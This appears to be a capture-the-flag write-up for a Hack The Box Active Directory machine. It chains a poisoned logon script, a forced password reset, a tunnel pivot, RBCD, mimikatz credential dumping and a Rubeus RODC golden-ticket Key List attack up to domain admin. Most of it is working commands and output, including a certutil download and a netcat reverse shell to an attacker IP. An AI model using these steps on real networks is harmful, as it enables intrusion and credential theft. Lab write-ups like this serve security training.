
<img src="Images/garfield.png" width="191" alt="garfield">


https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adds-rodc.md
# Attack Chain

```
j.arbuckle (provided creds)
  └─► Logon Script Abuse (SYSVOL write + scriptPath) → l.wilson (shell)
    └─► ForceChangePassword → l.wilson_adm (evil-winrm)
        └─► Ligolo pivot → 192.168.100.0/24
            └─► WriteAccountRestrictions RBCD → HACKERPC$ → Admin@RODC01
                └─► mimikatz lsadump::lsa → krbtgt_8245 (AES256)
                    └─► Manipulate PRP (RevealOnDemand + clear NeverReveal)
                        └─► Rubeus golden /rodcNumber:8245 → RODC TGT
                            └─► Rubeus asktgs /keyList → Key List Attack
                                └─► Administrator@DC01 ✅
```

# Sommaire

- [Enum](#enumeration)
	- [Nmap](#nmap)
	- [Bloodhound](#bloodhound)
- [Kerberoast](#kerberoast)
- [Pre-Windows 2000 Authentication Check](#pre-windows-2000-authentication-check)
- [SMB Shares](#smb-shares)
- [Logon Script Abuse](#logon-script-abuse)
	- [Upload files](#upload-files)
	- [Check AD Permissions](#check-ad-permissions)
	- [Set Logon Script to Liz Wilson](#set-logon-script-to-liz-wilson)
	- [Shell as j.wilson](#shell-as-jwilson)
- [Lateral Movement](#lateral-movement)
- [Compromise RODC01](#compromise-rodc01)
	- [IP Discovery](#ip-discovery)
	- [Setup Ligolo](#setup-ligolo)
	- [RBCD attack](#rbcd-attack)
- [Privilege Escalation](#privilege-escalation)
	- [Mimikatz](#mimikatz)
	- [Prerequire to move further](#prerequisites-to-move-further)
	- [Rubeus - Golden Ticket](#rubeus---golden-ticket)

---
As is common in real life pentests, you will start the Garfield box with credentials for the following account `j.arbuckle` / `Th1sD4mnC4t!@1978`
# Enumeration

### Nmap

```
nmap -sVC 10.129.14.86 -oN scan.txt                            Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-05 03:38 CEST
Nmap scan report for 10.129.14.86
Host is up (0.037s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-05 09:38:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-05T09:38:37+00:00
|_ssl-date: 2026-04-05T09:39:19+00:00; +8h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-04-05T09:38:41
|_  start_date: N/A
|_clock-skew: mean: 8h00m01s, deviation: 1s, median: 8h00m01s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.38 seconds
```

### Bloodhound

```
bloodhound-ce.py --zip -c All -d 'garfield.htb' -u "j.arbuckle" -p 'Th1sD4mnC4t!@1978' -ns "10.129.14.86"
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: garfield.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::fb80:e808:db4c:f8fd
INFO: Trying LDAP connection to dead:beef::fb80:e808:db4c:f8fd
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::fb80:e808:db4c:f8fd
INFO: Trying LDAP connection to dead:beef::fb80:e808:db4c:f8fd
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: RODC01.garfield.htb
INFO: Querying computer: DC01.garfield.htb
INFO: Done in 00M 17S
INFO: Compressing output into 20260405114251_bloodhound.zip
```

![Bloodhound J.arbuckle](Images/Bloodhound%20J.arbuckle.png)

Nothing is exploitable directly so let's move on


# Kerberoast

We can try to see if there is kerberoastable users.

```
GetUserSPNs.py -dc-ip "10.129.14.86" "garfield.htb"/"j.arbuckle":'Th1sD4mnC4t!@1978'
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

Unfortunately, there is none.

# Pre-Windows 2000 Authentication Check

From **bloodhound** we can see there is the group "`PRE-WINDOWS 2000 COMPATIBLE ACCESS@GARFIELD.HTB`" so we can try to see if the default password on targets are still used.
```
 pre2k auth -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d "garfield.htb" -dc-ip "10.129.14.86" -verbose

                                ___    __
                              /'___`\ /\ \
 _____   _ __    __          /\_\ /\ \\ \ \/'\
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\ \ \\`\
 \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
   \ \_\                                      v3.1
    \/_/
                                            @unsigned_sh0rt
                                            @Tw1sm

[12:13:15] INFO     Retrieved 2 results total.
[12:13:15] INFO     Testing started at 2026-04-05 12:13:15
[12:13:15] INFO     Using 10 threads
[12:13:15] DEBUG    Invalid credentials: garfield.htb\RODC01$:rodc01
[12:13:15] DEBUG    Invalid credentials: garfield.htb\DC01$:dc01
```
But this is not exploitable.

# SMB Shares

We can also see what's available in the shares we have access to

```
nxc smb '10.129.15.113' -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares

SMB         10.129.15.113   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.113   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB         10.129.15.113   445    DC01             [*] Enumerated shares
SMB         10.129.15.113   445    DC01             Share           Permissions     Remark
SMB         10.129.15.113   445    DC01             -----           -----------     ------
SMB         10.129.15.113   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.15.113   445    DC01             C$                              Default share
SMB         10.129.15.113   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.15.113   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.15.113   445    DC01             SYSVOL          READ            Logon server share
```

We can access the `SYSVOL` share, let's dig into it.

```
smbclient -U j.arbuckle //10.129.14.86/SYSVOL                  
Password for [WORKGROUP\j.arbuckle]: Th1sD4mnC4t!@1978

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 13 13:04:43 2025
  ..                                  D        0  Wed Aug 13 13:04:43 2025
  garfield.htb                       Dr        0  Wed Aug 13 13:04:43 2025

smb: \> cd garfield.htb\
smb: \garfield.htb\> ls
  .                                   D        0  Wed Aug 13 13:11:05 2025
  ..                                  D        0  Wed Aug 13 13:11:05 2025
  DfsrPrivate                      DHSr        0  Wed Aug 13 13:11:05 2025
  Policies                            D        0  Wed Aug 13 13:04:48 2025
  scripts                             D        0  Tue Jan 27 23:13:47 2026

smb: \garfield.htb\> cd scripts\
smb: \garfield.htb\scripts\> ls
  .                                   D        0  Tue Jan 27 23:13:47 2026
  ..                                  D        0  Tue Jan 27 23:13:47 2026
  printerDetect.bat                   A      217  Sat Sep 13 00:20:29 2025
```

The is a script inside let's download it and see what it reveals

```
cat printerDetect.bat

@echo off

echo Detecting installed printers...

echo ==============================



wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table



echo.

echo Printer detection completed.

pause
```
# Logon Script Abuse

It looks like it's a logon script. After some research, it can be abused to gain access to another user. By modifying the script in the SYSVOL share and leveraging our Write permissions on the target user to change their `scriptPath` attribute, we can execute commands with their privileges when the user connects to the machine.

### Upload files

To exploit it, we must first see if we can put files inside the Script folder in the `SYSVOL` share.
 
```
touch test
```
```
smb: \garfield.htb\scripts\> put test
putting file test as \garfield.htb\scripts\test (0.0 kb/s) (average 0.0 kb/s)
```

We can indeed put files inside the folder, so let's write a simple script to get a reverse shell.

```
cat printerDetect.bat
@echo off

certutil.exe -urlcache -f http://10.10.14.97/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.97 443
```

```
smb: \garfield.htb\scripts\> put printerDetect.bat
putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (1.6 kb/s) (average 5.1 kb/s)
```

### Check AD Permissions

Now we need to find an user we can attribute the script to by using `bloodyAD` to enumerate the writable the objects with our current user.

```
bloodyAD --host "10.129.15.113" -d "garfield.htb" -u "j.arbuckle" -p 'Th1sD4mnC4t!@1978' get writable

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE
```
### Set Logon Script to Liz Wilson

We have `WRITE` permission to the user `Liz Wilson`, let's attach the logon script to her.

```
bloodyAD --host "10.129.15.113" -d "garfield.htb" -u "j.arbuckle" -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v "printerDetect.bat"
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

### Shell as j.wilson

Now we start our python3 http server and our listener to get a shell.

```
python3 -m http.server 80
```

```
penelope -i tun0 -p 443
[+] Listening for reverse shells on 10.10.14.97:443
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[!] Stopping TCPListener(10.10.14.97:443)
[Apr 07, 2026 - 14:17:18 (CEST)] exegol-htb /workspace # nano printerDetect.bat
[Apr 07, 2026 - 14:17:31 (CEST)] exegol-htb /workspace # penelope -i tun0 -p 443
[+] Listening for reverse shells on 10.10.14.97:443
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from DC01~10.129.15.113-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍️ Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D
[+] Logging to /root/.penelope/sessions/DC01~10.129.15.113-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_04_07-14_43_45-645.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
whoami
garfield\l.wilson

C:\Windows\system32>
```

# Lateral Movement

Now that we have access to the user `j.wilson` let's get back to bloodhound.

![Bloodhound l.wilson_adm](Images/Bloodhound%20l.wilson_adm.png)

We have `ForceChangePassword` permission on the account `l.wilson_adm` so let's exploit that.
Since we do not have the password of `l.wilson`, we will have to do it through Windows.

```
C:\Users\l.wilson>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\$newpass = ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force $newpass -Reset
$newpass = ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force
PS C:\Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword $newpass -Reset -Force
Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword $newpass -Reset
```

Now we can test our creds with `nxc`

```
nxc smb '10.129.15.113' -u 'l.wilson_adm' -p 'Hacked123!'
<SNIP>
[+] garfield.htb\l.wilson_adm:Hacked123!
```

It works so let's connect with `evil-winrm`
```
evil-winrm -u "l.wilson_adm" -p 'Hacked123!' -i "10.129.15.113"
```

# Compromise RODC01


![Bloodhound RODC01 Path](Images/Bloodhound%20RODC01%20Path.png)

### IP Discovery

```
ipconfig
<SNIP>
Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::c4ff:5747:1d3c:fba0%9
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

Let's look which IP might belong to `RODC01`
```
cmd /c '(for /L %a IN (1,1,254) DO ping /n 1 /w 1 192.168.100.%a) | find "Reply"'
Reply from 192.168.100.1: bytes=32 time<1ms TTL=128
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
```

### Setup Ligolo


192.168.100.2 is probably our target, we need to use `ligolo-ng` to continue further and be able to access 192.168.100.2 from our attacking machine.

```
./proxy -selfcert
```
```
ip tuntap add user root mode tun ligolo
ip link set ligolo up
```
```
upload /workspace/agent.exe
.\agent.exe -ignore-cert -connect 10.10.14.*
```
```
ligolo-ng » INFO[0120] Agent joined.                                 id=00155d0bdd00 name="GARFIELD\\l.wilson_adm@DC01" remote="10.129.15.113:59306"
ligolo-ng » session
? Specify a session : 1 - GARFIELD\l.wilson_adm@DC01 - 10.129.15.113:59306 - 00155d0bdd00
[Agent : GARFIELD\l.wilson_adm@DC01] » start
INFO[0135] Starting tunnel to GARFIELD\l.wilson_adm@DC01 (00155d0bdd00)
```

```
ip route add 192.168.100.0/24 dev ligolo
```
```
ping -c 1 192.168.100.2
PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=36.4 ms
```
### RBCD attack

```
addcomputer.py 'garfield.htb/l.wilson_adm:Hacked123!' -dc-ip 10.129.15.113 -computer-name 'HACKERPC$' -computer-pass 'Password123!'

Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account HACKERPC$ with password Password123!.
```

```
rbcd.py 'garfield.htb/l.wilson_adm:Hacked123!' -delegate-to 'RODC01$' -delegate-from 'HACKERPC$' -dc-ip 10.129.15.113 -action 'write'

Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[+] NTLM bind succeeded.
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] HACKERPC$ can now impersonate users on RODC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     HACKERPC$    (S-1-5-21-2502726253-3859040611-225969357-10601)
```


```
faketime "$(rdate -n 10.129.15.113 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

Silver Ticket

```
getST.py 'garfield.htb/HACKERPC$:Password123!' -spn 'cifs/RODC01.garfield.htb' -impersonate 'Administrator' -dc-ip 10.129.15.113

Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```
Add the ticket to the environment variable `KRB5CCNAME`

```
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

# Privilege Escalation

An RODC has its own isolated `krbtgt` account (here, `krbtgt_8245`) so that tickets forged from it are only valid for the RODC itself, not the entire domain. 

To compromise the main DC, we must manipulate this **Password Replication Policy (PRP)**. By emptying the `msDS-NeverRevealGroup` (the Deny list, which includes Domain Admins by default) and adding the Administrator to the `msDS-RevealOnDemandGroup` (the Allow list), we trick the Active Directory architecture into authorizing the RODC to request and store the Domain Admin's hash. 
In AD, "Deny" rules always take precedence over "Allow" rules, making the clearing of the `NeverRevealGroup` an absolute necessity.

### Mimikatz

Now we can use `psexec.py` to connect to the target and use mimikatz to dump valuable information.

```
psexec.py -k -no-pass -dc-ip 10.129.15.113 -target-ip 192.168.100.2 'garfield.htb/Administrator@RODC01.garfield.htb'
```

```
python3 -m http.server 80
```
```
certutil.exe -urlcache -f http://10.10.14.97/mimikatz.exe C:\Windows\Temp\mimikatz.exe
```

We now we are on a Read Only Domain Controller which means there is a specific krbgt user that has rights to access DC01. Let's target that user with mimikatz. From bloodhound we know it's  `krbtgt_8245`.

```
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt_8245
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2
    LM   :
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

<SNIP>

 * Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

 * NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b

mimikatz(commandline) # exit
Bye!
```

Ok from the output, we have the `SID`, the hash `aes256_hmac` and the rodc number which is 8245 (corresponding to the username).

According to that article we can be able to forge a golden ticket.

https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-rodc/#rodc-golden-ticket

### Prerequisites to move further

We need to add the Administrator from DC01 to the group `RevealOnDemand` so the domain controller let us access it's information. Since we do not have enough privilege to do that we need first to add `l.wilson_adm` to the RODC Administrators group from the winrm session (We have admin privileges for that user).

```
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

Then we can add the Administrator to the group
```
bloodyAD --host 10.129.15.113 -d garfield.htb -u l.wilson_adm -p 'Hacked123!' \                              set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'

[+] CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb's msDS-RevealOnDemandGroup has been updated
```
We also need to add `RODC01` to the `NeverReveal` group to clear the list.

```
bloodyAD --host 10.129.15.113 -d garfield.htb -u l.wilson_adm -p 'Hacked123!' set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-NeverRevealGroup

[+] CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb's msDS-NeverRevealGroup has been updated
```

### Rubeus - Golden Ticket

Now we can forge a golden ticket for Administrator with every information we have.

```
.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /outfile:C:\Windows\Temp\ticket.kirbi /user:Administrator /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357
```
We can't directly access`DC01` with that forged Golden Ticket signed by the RODC's local `krbtgt`.

However, we can abuse the underlying replication protocol. By presenting our forged RODC TGT to the primary DC along with the `/keyList` flag, we simulate a legitimate request from the RODC asking for credential replication. 

Since we just added the Administrator to the allowed PRP list, `DC01` validates the request and returns the NTLM hash (and AES keys) of the Administrator account within the Kerberos response

```
.\Rubeus.exe asktgs /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /keyList /enctype:aes256 /ticket:C:\Windows\Temp\ticket_2026_04_08_03_57_40_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap

<SNIP>

  ServiceName              :  krbtgt/GARFIELD.HTB
  ServiceRealm             :  GARFIELD.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  GARFIELD.HTB
  StartTime                :  4/7/2026 8:58:59 PM
  EndTime                  :  4/8/2026 6:57:40 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  PklEIddJWgZBED2tsT06VFX71soEA40SwCTO9tnb8Uk=
  Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

We can test theses credentials now

```
nxc smb 10.129.15.113 -u 'Administrator' -H 'EE238F6DEBC752010428F20875B092D5'
SMB         10.129.15.113   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.113   445    DC01             [+] garfield.htb\Administrator:EE238F6DEBC752010428F20875B092D5 (admin)
```

It works, we can login with `evil-winrm` and grab the root flag.

```
evil-winrm -u "Administrator" -H 'EE238F6DEBC752010428F20875B092D5' -i "10.129.15.*"
```